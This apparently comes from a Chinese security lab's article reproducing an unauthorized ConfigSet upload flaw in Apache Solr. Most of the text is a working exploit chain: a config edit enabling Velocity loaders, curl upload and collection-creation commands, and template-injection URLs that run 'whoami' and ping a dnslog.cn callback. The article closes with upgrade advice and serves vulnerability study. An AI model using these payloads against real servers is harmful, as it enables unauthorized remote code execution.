\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/aw3rhAAPn1sCSZsEXVqZBA)

  

  

  

网安引领时代，弥天点亮未来   

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x00 漏洞****简述**  

  

Apache Solr 是一个独立的企业级搜索应用服务器，在 ConfigSet+API + 中存在未授权上传漏洞风险，被利用可能导致 RCE。
========================================================================

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x01 影响版本**

  

  

Apache+Solr+6.6.0+-6.6.5+

Apache+Solr+7.0.0+-7.7.3

Apache+Solr+8.0.0+-8.6.2

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x02 漏洞复现**

  

  

1、环境搭建

本次漏洞测试环境版本 solr-7.0.1，window 10 部署

Apache Solr 下载链接

```
http://archive.apache.org/dist/lucene/solr/7.0.1
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPjzibnRw7p4LQCSADGtY5y1WZByAJdzgpED3cpc8FejeHp0E6Q1dRtvjQ/640?wx_fmt=png)

2、进入相关目录 solr-7.0.1\\bin，启动 solr

```
solr.cmd start -c
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPjkicMlWL3s6eKvcqK17cS9MpOqzCJClkZJ2IZIQGhibx0QsianTLlLFB1w/640?wx_fmt=jpeg)

3、访问漏洞环境

http://192.168.60.1:8983

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPjtI4ToDLN7fHicgRUib0r4LxUBoaRtOXzkTGf5kzRcqYWP5UJiaB5e4VLw/640?wx_fmt=png)

4、漏洞利用

1\. 进入

```
server/solr/configsets/sample\_techproducts\_configs/conf
```

目录修改 solrconfig.xml 配置文件  

原配置内容：

```
<queryResponseWriter >
<str >${velocity.template.base.dir:}</str>
</queryResponseWriter>
```

修改后配置内容：

```
<queryResponseWriter >
<str >${velocity.template.base.dir:}</str>
<str >${velocity.solr.resource.loader.enabled:true}</str>
<str >${velocity.params.resource.loader.enabled:true}</str>
</queryResponseWriter>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPjGw5AVvtcbUNV2CPU5bcQWaUOice9fUKEqQ3O9Wzo1QRnrGnDtQLOodw/640?wx_fmt=png)

2\. 执行

```
zip -r - \* > yunzui.zip
```

**注意：这里需要 Linux 进行加载（Windows10 下可安装 Linux 子系统并安装 zip），且第一次占用空间很大！！！**

**apt-get install zip unzip  (root 权限)**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPjKfFMghaUQdDXrxXMicqYejeGy7fUKXzF7ic6AnGkSU19GmrbYKIG7icTQ/640?wx_fmt=png)

3\. 然后把 zip 通过命令行上传

```
curl -X POST --header "Content-Type:application/octet-stream" --data-binary @yunzui.zip "http://192.168.60.1:8983/solr/admin/configs?action=UPLOAD&
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPj4eKO2hrRMsIUAzANCeIwSkicIqPfY8RrQPC5KgXjBtyibIeN2C70JhEg/640?wx_fmt=png)

4\. 创建一个新的配置

```
curl "http://192.168.60.1:8983/solr/admin/collections?action=CREATE&
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPjCEdfzdHBKpvLJRGXGfqAN87rMHSx0TxjstXicQvsqkPDrcp5l1aqE6Q/640?wx_fmt=png)

5\. 测试命令执行

```
http://192.168.60.1:8983/solr/yunzui2/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+\[1..$out.available()\])$str.valueOf($chr.toChars($out.read()))%23end
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPj4jSnoatQria8vicX6F8kBXcVL5ibp4WmUUjPcNaaXCgyLLr6kvy6uU1icg/640?wx_fmt=jpeg)

通过 DNSLog 平台生成域名：

se5e2u.dnslog.cn

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPjn8r8v8cmaGeOXbWuBS97gPwbVmAb05YMafEPu8UVpwgicjIgwAbkGoQ/640?wx_fmt=png)

执行命令  

```
http://192.168.60.1:8983/solr/yunzui2/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='')+#set($rt=$x.class.forName('java.lang.Runtime'))+#set($chr=$x.class.forName('java.lang.Character'))+#set($str=$x.class.forName('java.lang.String'))+#set($ex=$rt.getRuntime().exec('ping se5e2u.dnslog.cn'))+$ex.waitFor()+#set($out=$ex.getInputStream())+#foreach($i+in+\[1..$out.available()\])$str.valueOf($chr.toChars($out.read()))#end
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPjFFgWEHh4W05u4YWhVw3ib9Xic43DicHhMwx9sNHoKn6GDOcPtyibosXMEA/640?wx_fmt=png)  

效果查看

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDqhj4iaHAotWbjLQl8t0zPjppSes6GQXO3bXUvwoPELoyuuKXe9plgKFC7KoXmAciawY5DnicIpa9kg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x03 修复建议**

  

  

升级 Solr 版本。

http://archive.apache.org/dist/lucene/solr/8.6.3/

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x04 参考链接**

  

  

https://blog.csdn.net/qq\_40989258/article/details/109121350

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif) 

知识分享完了

喜欢别忘了关注我们哦~  

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg)